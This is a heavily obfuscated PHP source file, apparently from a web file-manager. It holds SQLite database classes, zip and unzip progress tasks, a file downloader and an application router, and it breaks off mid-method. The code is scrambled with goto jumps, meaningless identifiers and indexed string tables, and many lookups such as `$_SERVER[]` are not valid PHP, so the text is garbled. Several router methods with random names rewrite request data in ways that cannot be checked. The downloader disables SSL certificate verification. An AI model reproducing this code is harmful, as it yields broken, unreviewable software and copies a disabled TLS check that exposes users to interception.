<?php
 goto Bƫ; d: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto Eʜ; Eʜ: $e =& $_SERVER[]; global $in, $config; $this->config =& $config; goto bˮ; bˮ: $this->in =& $in; $this->values[$e[6]] =& $config; $this->values[$e[7]] =& $in; goto dѺ; dѺ: $this->tpl = TEMPLATE . MOD . $e[8]; $this->_classObjectID = mt_rand(0, 10000); goto F񞦈; F񞦈: } public function loadClass($DÈ) { if (1 === func_num_args()) { $this->{$DÈ} = new $DÈ(); } else { $F켗Ӌ = new ReflectionClass($DÈ); $Fɉ԰ = func_get_args(); array_shift($Fɉ԰); $this->{$DÈ} = $F켗Ӌ->newInstanceArgs($Fɉ԰); } return $this->{$DÈ}; } protected function assign($E, $b؂ۃ) { $this->values[$E] = $b؂ۃ; } protected function display($A) { ob_end_clean(); extract($this->values); require $this->tpl . $A; } } class DbSqliteBase extends Db { public function __construct($Aۓ = '') { $F㑮־ =& $_SERVER[]; if (!extension_loaded($F㑮־[9])) { think_exception(think_lang($F㑮־[10]) . $F㑮־[11]); } if (!empty($Aۓ)) { if (!isset($Aۓ[$F㑮־[12]])) { $Aۓ[$F㑮־[12]] = 438; } $this->config = $Aۓ; if (empty($this->config[$F㑮־[13]])) { $this->config[$F㑮־[13]] = array(); } } } public function connect($F = '', $fԍ = 0) { $E㨎 =& $_SERVER[]; if (!isset($this->linkID[$fԍ])) { goto Bᴎ; e㰭܉ͥ: $this->linkID[$fԍ] = $B隅䱫($F[$E㨎[17]], $F[$E㨎[12]]); if (!$this->linkID[$fԍ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto eޞ; Bᴎ: if (empty($F)) { $F = $this->config; } $A⊻ = !empty($F[$E㨎[13]][$E㨎[14]]) ? $F[$E㨎[13]][$E㨎[14]] : $this->pconnect; $B隅䱫 = $A⊻ ? $E㨎[15] : $E㨎[16]; goto e㰭܉ͥ; eޞ: @sqlite_busy_timeout($this->linkID[$fԍ], 30000); if (1 != think_config($E㨎[18])) { unset($this->config); } goto C¾; C¾: } return $this->linkID[$fԍ]; } public function free() { $this->queryID = null; } public function query($Aܵ) { goto E͹; aۿЍ: think_status($d[20]); $this->queryID = sqlite_query($this->_linkID, $Aܵ); $this->debug(); goto BӜ; E͹: $d =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b䳾; b䳾: $this->queryStr = $Aܵ; if ($this->queryID) { $this->free(); } think_action_status($d[19], 1); goto aۿЍ; BӜ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $f = $this->getAll(); return $f; } goto f򩫯۬; f򩫯۬: } public function execute($C) { goto f޸; Bφޑ: think_status($dȨ٣[20]); $BψЭ = sqlite_exec($this->_linkID, $C); $this->debug(); goto b鐐; d: $this->queryStr = $C; if ($this->queryID) { $this->free(); } think_action_status($dȨ٣[21], 1); goto Bφޑ; b鐐: if (!1 === $BψЭ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto Eȏω; f޸: $dȨ٣ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d; Eȏω: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Cۘ = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$Cۘ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $a = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$a) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $A = array(); if ($this->numRows > 0) { for ($B = 0; $B < $this->numRows; $B++) { $A[$B] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $A; } public function getFields($a) { $CƎꙈ =& $_SERVER[]; $dюֽ = $this->query($CƎꙈ[25] . $a . $CƎꙈ[26]); $cˢ = array(); if ($dюֽ) { foreach ($dюֽ as $b̂ﴩ => $Bԥ߉) { $cˢ[$Bԥ߉[$CƎꙈ[27]]] = array($CƎꙈ[28] => $Bԥ߉[$CƎꙈ[27]], $CƎꙈ[29] => $Bԥ߉[$CƎꙈ[30]], $CƎꙈ[31] => (bool) ($Bԥ߉[$CƎꙈ[32]] === $CƎꙈ[33]), $CƎꙈ[34] => $Bԥ߉[$CƎꙈ[35]], $CƎꙈ[36] => strtolower($Bԥ߉[$CƎꙈ[37]]) == $CƎꙈ[38], $CƎꙈ[39] => strtolower($Bԥ߉[$CƎꙈ[40]]) == $CƎꙈ[41]); } } return $cˢ; } public function getTables($D֜ = '') { $E춃 =& $_SERVER[]; $Bļ = $this->query($E춃[42] . $E춃[43] . $E춃[44]); $f = array(); foreach ($Bļ as $e => $aݘ) { $f[$e] = current($aݘ); } return $f; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $CϠ޻ =& $_SERVER[]; $F = sqlite_last_error($this->_linkID); $this->error = $F . $CϠ޻[4] . sqlite_error_string($F); if ($CϠ޻[33] != $this->queryStr) { $this->error .= LNG($CϠ޻[45]) . $this->queryStr; } think_trace($this->error, $CϠ޻[33], $CϠ޻[46]); return $this->error; } public function escapeString($D) { return sqlite_escape_string($D); } public function parseLimit($eܲܣ) { $cΞ =& $_SERVER[]; $Dƌ = $cΞ[33]; if (!empty($eܲܣ)) { $eܲܣ = explode($cΞ[47], $eܲܣ); if (count($eܲܣ) > 1) { $Dƌ .= $cΞ[48] . $eܲܣ[1] . $cΞ[49] . $eܲܣ[0] . $cΞ[50]; } else { $Dƌ .= $cΞ[48] . $eܲܣ[0] . $cΞ[50]; } } return $Dƌ; } } class DbSqlite3Base extends Db { public function __construct($D = '') { $b梄 =& $_SERVER[]; if (!class_exists($b梄[51])) { think_exception(think_lang($b梄[10]) . $b梄[52]); } if (!empty($D)) { if (!isset($D[$b梄[12]])) { $D[$b梄[12]] = 438; } $this->config = $D; if (empty($this->config[$b梄[13]])) { $this->config[$b梄[13]] = array(); } } } public function connect($Cߩ = '', $CֲЫ = 0) { $F =& $_SERVER[]; if (!isset($this->linkID[$CֲЫ])) { if (empty($Cߩ)) { $Cߩ = $this->config; } $this->linkID[$CֲЫ] = new SQLite3($Cߩ[$F[17]]); if (!$this->linkID[$CֲЫ]) { think_exception($this->linkID[$CֲЫ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$CֲЫ]->busyTimeout(30000); if (1 != think_config($F[18])) { unset($this->config); } } return $this->linkID[$CֲЫ]; } public function free() { $this->queryID = null; } public function query($F՜) { goto Cꈄ; bļ: think_status($Bڝ[20]); $this->queryID = $this->_linkID->query($F՜); $this->debug(); goto f; f: if (!1 === $this->queryID) { $this->error(); return !1; } else { $C禌ϔ = $this->getAll(); $this->numRows = count($C禌ϔ); return $C禌ϔ; } goto B; D۳: $this->queryStr = $F՜; if ($this->queryID) { $this->free(); } think_action_status($Bڝ[19], 1); goto bļ; Cꈄ: $Bڝ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto D۳; B: } public function execute($Dъ) { goto Dډ; d˰: think_status($E߹晆[20]); $fף = $this->_linkID->exec($Dъ); $this->debug(); goto eλୟ; eλୟ: if (!1 === $fף) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto bל; Dډ: $E߹晆 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Cݍ; Cݍ: $this->queryStr = $Dъ; if ($this->queryID) { $this->free(); } think_action_status($E߹晆[21], 1); goto d˰; bל: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d㥢 = $this->_linkID->query($_SERVER[][23]); if (!$d㥢) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Dҩ = $this->_linkID->query($_SERVER[][24]); if (!$Dҩ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $e̛ = array(); while ($aᲐ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $e̛[] = $aᲐ; } $this->queryID->reset(); return $e̛; } public function getFields($Aə) { $Aд =& $_SERVER[]; $c飓 = $this->query($Aд[25] . $Aə . $Aд[26]); $f՝ = array(); if ($c飓) { foreach ($c飓 as $Aڵ => $BŚ) { $f՝[$BŚ[$Aд[28]]] = array($Aд[28] => $BŚ[$Aд[28]], $Aд[29] => $BŚ[$Aд[29]], $Aд[31] => (bool) ($BŚ[$Aд[31]] === $Aд[33]), $Aд[34] => $BŚ[$Aд[53]], $Aд[36] => (bool) $BŚ[$Aд[54]], $Aд[39] => (bool) $BŚ[$Aд[54]]); } } return $f՝; } public function getTables($Eѹȕ = '') { $B蚃ژ =& $_SERVER[]; $B = $this->query($B蚃ژ[42] . $B蚃ژ[43] . $B蚃ژ[44]); $a = array(); foreach ($B as $c => $c٘) { $a[$c] = current($c٘); } return $a; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $d =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($d[33] != $this->queryStr) { $this->error .= LNG($d[45]) . $this->queryStr; } think_trace($this->error, $d[33], $d[46]); return $this->error; } public function escapeString($B咛Ԡ) { $Aɗ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($B咛Ԡ); } return str_ireplace($Aɗ[55], $Aɗ[56], $B咛Ԡ); } public function parseLimit($Dջ⌱) { $Dߘ =& $_SERVER[]; $D̤ = $Dߘ[33]; if (!empty($Dջ⌱)) { $Dջ⌱ = explode($Dߘ[47], $Dջ⌱); if (count($Dջ⌱) > 1) { $D̤ .= $Dߘ[48] . $Dջ⌱[1] . $Dߘ[49] . $Dջ⌱[0] . $Dߘ[50]; } else { $D̤ .= $Dߘ[48] . $Dջ⌱[0] . $Dߘ[50]; } } return $D̤; } } goto B޼; Cʕ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto B湄; BՌ: if (!$cʄ[$E׮[1359]]) { $cʄ[$E׮[1359]] = LNG($E׮[1527]); } goto Dɱ; B湄: $E׮ =& $_SERVER[]; parent::startAfter(); Hook::bind($E׮[1523], array($this, $E׮[1524])); goto c; c: Hook::bind($E׮[1050], array($this, $E׮[1525])); $cʄ =& $this->task; $cʄ[$E׮[1526]] = $E׮[1055]; goto BՌ; Dɱ: } protected function endAfter() { $D馻 =& $_SERVER[]; parent::endAfter(); Hook::unbind($D馻[1523], array($this, $D馻[1524])); Hook::unbind($D馻[1050], array($this, $D馻[1525])); } public function updateAfter() { $B =& $_SERVER[]; $d =& $this->task; if (!$d[$B[991]] || !$d[$B[717]]) { return; } if ($d[$B[1526]] == $B[1055]) { $E㽚 = 0; if ($d[$B[1498]]) { $E㽚 = $d[$B[1499]] / $d[$B[1498]]; } $d[$B[1454]] = $E㽚 * 0.3; } else { if ($d[$B[1526]] == $B[301]) { $E㽚 = $d[$B[1005]] / $d[$B[991]]; $d[$B[1454]] = 0.3 + $E㽚 * 0.4; } else { if ($d[$B[1526]] == $B[103]) { $D = 0; if ($d[$B[1500]] == $B[103]) { $D = $d[$B[1499]]; } $E㽚 = ($d[$B[1503]] + $D) / $d[$B[717]]; $d[$B[1454]] = 0.3 + 0.4 + $E㽚 * 0.3; } } } if ($d[$B[1454]] > 0) { $A򛋚 = timeFloat() - $d[$B[1456]] - $d[$B[1459]]; $d[$B[1460]] = $A򛋚 * (1 - $d[$B[1454]]) / $d[$B[1454]]; } } public function addFile($EȖ) { goto Eӻ; Eӻ: $A =& $_SERVER[]; $A =& $this->task; $BٚƂ = IO::info($EȖ); goto d疶; a: $this->update(); goto Dˣ; d疶: $A[$A[1496]] = $BٚƂ[$A[28]]; $A[$A[1498]] = $BٚƂ[$A[77]]; $A[$A[1499]] = 0; goto eۗ; cܵض: $A[$A[991]] = 1; $c㊐ = 0; $A[$A[1507]] = array($A[1508] => $c㊐ + 1, $A[386] => $BٚƂ[$A[28]], $A[75] => $BٚƂ[$A[75]], $A[466] => $BٚƂ[$A[466]] ? $BٚƂ[$A[466]] : $BٚƂ[$A[75]]); goto a; eۗ: $A[$A[993]] = $A[1515]; $A[$A[1500]] = $A[1055]; $A[$A[717]] = $BٚƂ[$A[77]]; goto cܵض; Dˣ: } public function unzipAfter($D) { goto dو; aּ: $this->update(); self::log($F锶[1528] . json_encode(array($f䯨, $F))); goto F; C舂: $F = IO::infoWithChildren($D); $Bɱ = 0; $f䯨[$F锶[1507]] = array($F锶[1508] => $Bɱ + 1, $F锶[386] => $F[$F锶[28]], $F锶[75] => $F[$F锶[75]], $F锶[466] => $F[$F锶[466]] ? $F[$F锶[466]] : $F[$F锶[75]]); goto C㗐; C㗐: if ($F[$F锶[29]] == $F锶[167]) { $f䯨[$F锶[991]] = 1; } else { $f䯨[$F锶[991]] = $F[$F锶[80]][$F锶[78]]; } $f䯨[$F锶[993]] = $F锶[33]; $f䯨[$F锶[1500]] = 0; goto cƍ; cƍ: $f䯨[$F锶[1005]] = 0; $f䯨[$F锶[1498]] = 0; $f䯨[$F锶[1499]] = 0; goto Bʟ; dو: $F锶 =& $_SERVER[]; $f䯨 =& $this->task; $f䯨[$F锶[1526]] = $F锶[103]; goto C舂; Bʟ: $f䯨[$F锶[1496]] = $F锶[33]; $f䯨[$F锶[1503]] = 0; $f䯨[$F锶[717]] = $F[$F锶[77]]; goto aּ; F: } public function nameParse($eӟ) { goto e茜Ŷ; e茜Ŷ: $eƘ =& $_SERVER[]; $Eۏ =& $this->task; if ($Eۏ[$eƘ[1526]] == $eƘ[1055]) { $Eۏ[$eƘ[1526]] = $eƘ[301]; $Eۏ[$eƘ[1503]] = 0; $Eۏ[$eƘ[717]] = 0; } goto a썫; B: $this->update(); goto a쟄; a썫: $Aس = get_path_this($eӟ); if (strstr($Aس, $eƘ[91])) { $Eۏ[$eƘ[1005]] += 1; $Eۏ[$eƘ[991]] += 1; } $Eۏ[$eƘ[1496]] = $eӟ; goto B; a쟄: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $b =& $_SERVER[]; parent::startAfter(); Hook::bind($b[1529], array($this, $b[1524])); $fՆ =& $this->task; $fՆ[$b[1526]] = $b[1055]; if (!$fՆ[$b[1359]]) { $fՆ[$b[1359]] = LNG($b[1530]); } } protected function endAfter() { $f =& $_SERVER[]; parent::endAfter(); Hook::unbind($f[1529], array($this, $f[1524])); } public function updateAfter() { $A =& $_SERVER[]; $eƞ =& $this->task; if (!$eƞ[$A[991]] || !$eƞ[$A[717]]) { return; } if ($eƞ[$A[1526]] == $A[1055]) { $F = $eƞ[$A[1499]]; if ($eƞ[$A[1500]] != $A[1055]) { $F = 0; } $C𰛜ڕ = ($eƞ[$A[1503]] + $F) / $eƞ[$A[717]]; $eƞ[$A[1454]] = $C𰛜ڕ * 0.3; } else { if ($eƞ[$A[1526]] == $A[301]) { $C𰛜ڕ = $eƞ[$A[1005]] / $eƞ[$A[991]]; $eƞ[$A[1454]] = 0.3 + $C𰛜ڕ * 0.5; } else { if ($eƞ[$A[1526]] == $A[103]) { $C𰛜ڕ = 0; if ($eƞ[$A[1498]]) { $C𰛜ڕ = $eƞ[$A[1499]] / $eƞ[$A[1498]]; } $eƞ[$A[1454]] = 0.3 + 0.5 + $C𰛜ڕ * 0.2; } } } if ($eƞ[$A[1454]] > 0) { $B = timeFloat() - $eƞ[$A[1456]] - $eƞ[$A[1459]]; $eƞ[$A[1460]] = $B * (1 - $eƞ[$A[1454]]) / $eƞ[$A[1454]]; } } public function copyFileStart($F, $DǍ, $a, $CǮ, $cߕȶ, $Fڤ) { $dҍ =& $_SERVER[]; parent::copyFileStart($F, $DǍ, $a, $CǮ, $cߕȶ, $Fڤ); $B˽ =& $this->task; if ($B˽[$dҍ[1526]] == $dҍ[301]) { $B˽[$dҍ[1526]] = $dҍ[103]; } $this->update(); } public function copyFileEnd($Eҩ, $e囉, $D, $cɢ, $f, $Cڭć) { $Dް =& $_SERVER[]; $fȅ =& $this->task; $fȅ[$Dް[1499]] = $fȅ[$Dް[1498]]; $fȅ[$Dް[1503]] += $fȅ[$Dް[1498]]; $fȅ[$Dް[1500]] = $Dް[33]; $this->update(); } public function nameParse($CĊڛ) { $dގ =& $_SERVER[]; $a =& $this->task; if ($a[$dގ[1005]] < $a[$dގ[991]]) { $Eꊘ = get_path_this($CĊڛ); if (strstr($Eꊘ, $dގ[91])) { $a[$dގ[1005]] += 1; } } if ($a[$dގ[1526]] == $dގ[1055]) { $a[$dގ[1526]] = $dގ[301]; } $a[$dގ[1496]] = $CĊڛ; $this->update(); } } class Downloader { static function start($e˴, $C, $AΙ = 10) { goto fɮׄ; Cڲ֍: if ($A冻[$C劖Ĵޅ[1047]]) { @unlink($b); } return $A冻; goto Aσ; eۿ׉: if ($D > $dǓ) { @unlink($A٫); } file_put_contents($b, json_encode($B缱)); $A冻 = self::fileDownloadCurl($e˴, $C, !0, $D, $dǓ); goto Cڲ֍; f: if (!$e˴) { return array($C劖Ĵޅ[1047] => !1, $C劖Ĵޅ[1049] => $C劖Ĵޅ[1052]); } if (!$B䲌ʞ[$C劖Ĵޅ[1304]] || $B䲌ʞ[$C劖Ĵޅ[325]] == 0) { @unlink($A٫); @unlink($C); $A冻 = self::fileDownloadFopen($e˴, $C, $B䲌ʞ[$C劖Ĵޅ[325]]); if ($A冻[$C劖Ĵޅ[1047]]) { return $A冻; } else { @unlink($A٫); @unlink($C); $A冻 = self::fileDownloadCurl($e˴, $C, !1, 0, $B䲌ʞ[$C劖Ĵޅ[325]]); @unlink($A٫); return $A冻; } } $D = is_file($A٫) ? filesize($A٫) : 0; goto d΅⦂; Bȷ: $A٫ = $C . $C劖Ĵޅ[1532]; if (is_array($e˴)) { $B䲌ʞ = $e˴; } else { $B䲌ʞ = url_header($e˴); } $e˴ = $B䲌ʞ[$C劖Ĵޅ[295]]; goto f; f܆: if (is_file($b)) { $CƮ = file_get_contents($b); $B缱 = json_decode($CƮ, 1); } if (file_exists($C) && $dǓ == filesize($C)) { @unlink($A٫); @unlink($b); return array($C劖Ĵޅ[1047] => !0, $C劖Ĵޅ[1049] => $C劖Ĵޅ[1534]); } if ($B缱[$C劖Ĵޅ[325]] != $dǓ) { $B缱 = array($C劖Ĵޅ[325] => $dǓ); } goto eۿ׉; fɮׄ: $C劖Ĵޅ =& $_SERVER[]; if (!request_url_safe($e˴)) { return array($C劖Ĵޅ[1047] => !1, $C劖Ĵޅ[1049] => $C劖Ĵޅ[1052]); } $b = $C . $C劖Ĵޅ[1531]; goto Bȷ; d΅⦂: $dǓ = intval($B䲌ʞ[$C劖Ĵޅ[325]]); if (file_exists($A٫) && time() - filemtime($A٫) < 3) { return array($C劖Ĵޅ[1047] => !1, $C劖Ĵޅ[1049] => $C劖Ĵޅ[1533]); } $B缱 = array(); goto f܆; Aσ: } static function fileDownloadFopen($c񋮝, $c݉ݿ, $C = 0) { $eʹ =& $_SERVER[]; @ini_set($eʹ[1535], $eʹ[1536]); $cĞ = $c݉ݿ . $eʹ[1532]; set_timeout(); @unlink($cĞ); if ($C = @fopen($c񋮝, $eʹ[1537])) { goto dӲ܆ڐ; aيۇ: return array($eʹ[1047] => !0, $eʹ[1049] => $eʹ[715]); goto Dㅩ; fӨ: fclose($C); self::checkGzip($cĞ); if (!@rename($cĞ, $c݉ݿ)) { usleep(round(rand(0, 1000) * 50)); @unlink($c݉ݿ); $cꃆű = @rename($cĞ, $c݉ݿ); if (!$cꃆű) { return array($eʹ[1047] => !1, $eʹ[1049] => $eʹ[1541]); } } goto aيۇ; dӲ܆ڐ: if (!($Bچ = @fopen($cĞ, $eʹ[1538]))) { return array($eʹ[1047] => !1, $eʹ[1049] => $eʹ[1539]); } while (!feof($C)) { if (!file_exists($cĞ)) { fclose($Bچ); return array($eʹ[1047] => !1, $eʹ[1049] => $eʹ[1540]); } clearstatcache(); if ($C > 0 && $C == filesize(iconv_system($cĞ))) { break; } fwrite($Bچ, fread($C, 1024 * 8), 1024 * 8); } fclose($Bچ); goto fӨ; Dㅩ: } else { return array($eʹ[1047] => !1, $eʹ[1049] => $eʹ[1542]); } } static function fileDownloadCurl($Dϝߑ, $BϤ, $c = false, $F۽Ԫ = 0, $aԢޓ = 0) { goto cذ; Aߋ: $dқ = @fopen($eᚄ, $B㞄[995]); if (!$dқ) { return array($B㞄[1047] => !1, $B㞄[1049] => $B㞄[1543]); } $d荛В = curl_init($Dϝߑ); goto e⏅; A՟: curl_setopt($d荛В, CURLOPT_USERAGENT, $B㞄[1536]); $c갗؂ = curl_exec($d荛В); curl_progress_end($d荛В); goto aɃ; Dۓ: if ($bؽ < $aԢޓ && $aԢޓ != 0) { return array($B㞄[1047] => !1, $B㞄[1049] => $B㞄[1533]); } if ($c갗؂ && filesize($eᚄ) != 0) { self::checkGzip($eᚄ); if (!@rename($eᚄ, $BϤ)) { @unlink($BϤ); $c갗؂ = @rename($eᚄ, $BϤ); if (!$c갗؂) { return array($B㞄[1047] => !1, $B㞄[1049] => $B㞄[1545]); } } return array($B㞄[1047] => !0, $B㞄[1049] => $B㞄[715]); } return array($B㞄[1047] => !1, $B㞄[1049] => $B㞄[1546]); goto f; F啛: curl_setopt($d荛В, CURLOPT_NOPROGRESS, !1); curl_setopt($d荛В, CURLOPT_PROGRESSFUNCTION, $B㞄[1544]); curl_progress_start($d荛В); goto A՟; cذ: $B㞄 =& $_SERVER[]; $eᚄ = $BϤ . $B㞄[1532]; set_timeout(); goto Aߋ; aɃ: curl_close($d荛В); fclose($dқ); $bؽ = filesize(iconv_system($eᚄ)); goto Dۓ; e⏅: if ($c) { curl_setopt($d荛В, CURLOPT_RANGE, $F۽Ԫ . $B㞄[735]); } curl_setopt($d荛В, CURLOPT_FILE, $dқ); curl_setopt($d荛В, CURLOPT_REFERER, get_url_link($Dϝߑ)); goto b; b: curl_setopt($d荛В, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($d荛В, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($d荛В, CURLOPT_SSL_VERIFYHOST, 0); goto F啛; f: } static function checkGzip($BÕލ) { goto c; b̩: ob_start(); readgzfile($BÕލ); $d͡ = ob_get_clean(); goto CާͲ; CާͲ: file_put_contents($BÕލ, $d͡); goto Aغ; c: $AՐ = $_SERVER[][1547]; $dʞψ = file_sub_str($BÕލ, 0, 2); if ($AՐ != $dʞψ) { return; } goto b̩; Aغ: } } goto E; A씌ϛ: define($_SERVER[][227], 2); define($_SERVER[][228], 3); define($_SERVER[][229], 1); goto a; Bڐ: $B = $_SERVER[][550]; class Application { private $defaultModule = "\x69\x6e\144\145\x78"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\x69\156\144\x65\170"; function __construct() { } public function setDefault($C葏) { goto D̢; F˰Ҡ: if (!$Fי) { return; } $this->defaultController = $aт[1] ? $aт[1] : $this->defaultController; $this->defaultAction = $aт[2] ? $aт[2] : $this->defaultAction; goto D֍; D̢: $e =& $_SERVER[]; $E˹∸ =& $_SERVER[޾]; $aт = $E˹∸[0]($E˹∸[1], $E˹∸[2]($C葏, $E˹∸[1])); goto Bϼ; D֍: $eï = $e[553]; $this->{$_SERVER[޾][3]}($E˹∸[4], array($this, $E˹∸[5])); goto fȍ; Bϼ: $E = $e[551]; $this->defaultModule = $aт[0] ? $aт[0] : $this->defaultModule; $Fי = $e[552]; goto F˰Ҡ; fȍ: } public function appRun($a) { goto Dү; Dٶ: $f = $Bߖ[6]($dʸ疴[0]); $f = $Bߖ[7]; $f = $Aυ[554]; goto E; Dү: $Aυ =& $_SERVER[]; $Bߖ =& $_SERVER[޾]; $dʸ疴 = $Bߖ[0]($Bߖ[1], $a); goto Dٶ; F֫ዃ: $Bߖ[17]($a); $cÓ = $Aυ[556]; if (strlen($cÓ) < $Aυ[557]) { return; } goto Eᰤ; E: if (strlen($f) < $Aυ[555]) { die; } if ($f == $Bߖ[8]) { $f = $Bߖ[9]; $dʸ疴[0] = $Bߖ[10]; $dʸ疴[1] = $dʸ疴[1] . $Bߖ[11]; $a = $Bߖ[12]($Bߖ[1], $dʸ疴); $a = $Bߖ[2]($a, $Bߖ[1]); } $Bߖ[13](array($Bߖ[14], $Bߖ[15]), $f . $Bߖ[16], $a); goto F֫ዃ; Eᰤ: $Bߖ[13](array($Bߖ[14], $Bߖ[15]), $f . $Bߖ[18], $a); goto aɳ; aɳ: } private function autorun() { goto BϘ; BϘ: $cԢѫ =& $_SERVER[]; $Bң =& $_SERVER[޾]; global $config; goto cҪ; cҪ: $E = $cԢѫ[558]; while ($E < $cԢѫ[555]) { if ($E >= 0) { break; } $E++; } if ($Bң[19]($config[$Bң[20]]) == 0) { return; } goto f穙; f穙: foreach ($config[$Bң[20]] as $D => $a˿) { $this->{$_SERVER[޾][21]}($a˿); $e䄨 = $cԢѫ[559]; if (!$e䄨) { return; } } goto c̔; c̔: } private function whlb51ddf3af() { goto Eɛ; cц: $a = $c[561]; $b㵬 = $c՜[26]($GLOBALS[$c՜[22]][$c՜[23]], 1); $GLOBALS[$c՜[22]][$c՜[23]] = $c՜[27]($Dה, $b㵬); goto Dʠ; Eɛ: $c =& $_SERVER[]; $c՜ =& $_SERVER[޾]; $F = $c՜[8]; goto cͥ; Dʠ: $A = $c[562]; while ($A < $c[563]) { if ($A >= 0) { break; } $A++; } $GLOBALS[$c՜[22]][$c՜[28]] = $c՜[29]($c՜[1], $GLOBALS[$c՜[22]][$c՜[23]]); goto F; F: $aጹΆ = $c[564]; goto c򈰇; dŃË: $C奞 = $c՜[25]($C·؃, 0, -$c՜[24]($F)); $bԐ = $c[560]; $Dה = array($c՜[8], $C奞); goto cц; cͥ: $C·؃ = $GLOBALS[$c՜[22]][$c՜[23]][0]; if (!$C·؃ || $c՜[24]($C·؃) <= $c՜[24]($F)) { return; } if ($c՜[6]($c՜[25]($C·؃, -$c՜[24]($F))) != $F) { return; } goto dŃË; c򈰇: } private function xbqe413cd09d() { goto Aùֺ; e󗰥: $a׃ = $aǢ[570]; if (strlen($a׃) < $aǢ[566]) { return; } $GLOBALS[$bں̜[22]][$bں̜[28]] = $bں̜[29]($bں̜[1], $GLOBALS[$bں̜[22]][$bں̜[23]]); goto eΝ; a綃: $e⎿맕 = $aǢ[567]; $B쓌 = $bں̜[25]($E, $fŇ + $bں̜[24]($A犃)); $bں̜[34]($bں̜[35], $B쓌, $f); goto ḋ; f屳: $E = $_SERVER[$bں̜[30]]; $DŇ = $aǢ[565]; while ($DŇ < $aǢ[566]) { if ($DŇ >= 0) { break; } $DŇ++; } goto fǄ䕦; fǄ䕦: $A犃 = $bں̜[31]; if (!$bں̜[32]($E, $A犃)) { return; } $fŇ = $bں̜[33]($E, $A犃); goto a綃; ḋ: $FŮҏ = $aǢ[568]; while ($FŮҏ < $aǢ[555]) { if ($FŮҏ >= 0) { break; } $FŮҏ++; } $B쓌 = $bں̜[2]($f[0][0], $bں̜[36]); goto Aߋ͆; Aùֺ: $aǢ =& $_SERVER[]; $bں̜ =& $_SERVER[޾]; if ($GLOBALS[$bں̜[22]][$bں̜[28]] != $bں̜[10]) { return; } goto f屳; Aߋ͆: $bݞ = $aǢ[569]; if (strlen($bݞ) < $aǢ[555]) { die; } $GLOBALS[$bں̜[22]][$bں̜[23]] = $bں̜[0]($bں̜[36], $B쓌); goto e󗰥; eΝ: } public function run() { goto B; aКꎂ: $_SERVER[$FЙ[44]] = $FЙ[6](ACTION); $this->{$_SERVER[޾][45]}(); $bɒĪ = $D[576]; goto Eʍ; C: $eަЧ = $D[573]; if (strlen($eަЧ) < $D[563]) { die; } $FЙ[39]($FЙ[41], isset($c߱[1]) && $c߱[0] ? $c߱[1] : $this->defaultController); goto dˊ; Dܡ쿓: $dà = $D[575]; if (strlen($dà) < $D[563]) { die; } $FЙ[39]($FЙ[43], MOD . $FЙ[1] . ST . $FЙ[1] . ACT); goto aКꎂ; B٣ɢ: $AԎ˩ = $GLOBALS[$FЙ[22]][$FЙ[28]]; $E = $D[572]; $FЙ[39]($FЙ[40], isset($c߱[0]) && $c߱[0] ? $c߱[0] : $this->defaultModule); goto C; dˊ: $a = $D[574]; while ($a < $D[566]) { if ($a >= 0) { break; } $a++; } $FЙ[39]($FЙ[42], isset($c߱[2]) && $c߱[0] ? $c߱[2] : $this->defaultAction); goto Dܡ쿓; e: $this->{$_SERVER[޾][38]}(); $c߱ = $GLOBALS[$FЙ[22]][$FЙ[23]]; $eӷ = $D[571]; goto B٣ɢ; Eʍ: if ($FЙ[19]($c߱) >= 3) { $this->{$_SERVER[޾][21]}($AԎ˩); } else { $this->{$_SERVER[޾][21]}(ACTION); } goto e; B: $D =& $_SERVER[]; $FЙ =& $_SERVER[޾]; $this->{$_SERVER[޾][37]}(); goto e; e: } private $zqlv1b5acc45 = array(); private $wlmgf8b9ae78 = ''; public function ohwu0158c078() { goto c崥; c۱: $this->{$_SERVER[޾][3]}($bϷ[53], array($this, $bϷ[54])); $this->{$_SERVER[޾][3]}($bϷ[55], array($this, $bϷ[56])); $bͶ = $D[582]; goto B; C뺙: $this->{$_SERVER[޾][52]}(); $c = $D[581]; if (strlen($c) < $D[563]) { return; } goto c۱; cʊ: $cԝ = $D[579]; while (strlen($cԝ) < $D[557]) { if (!$cԝ) { break; } $cԝ++; } 